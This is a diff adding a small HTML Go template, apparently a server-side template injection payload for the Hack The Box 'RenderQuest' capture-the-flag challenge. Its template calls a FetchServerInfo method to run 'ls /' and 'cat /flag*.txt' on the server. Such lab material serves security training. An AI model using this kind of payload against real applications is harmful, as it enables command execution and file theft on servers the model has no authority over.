@@ -1,0 +1,12 @@
+<html>
+<head>
+    <title>Document</title>
+</head>
+<body>
+    <p>Client IP: {{.ClientIP}}</p>
+    <p>User Agent: {{.ClientUA}}</p>
+    <h1>HTB RenderQuest</h1>
+    <p><b>Show dir:</b> {{.FetchServerInfo "ls /"}}</p>
+    <p><b>Flag content:</b> {{.FetchServerInfo "cat /flag*.txt"}}</p>
+</body>
+</html>
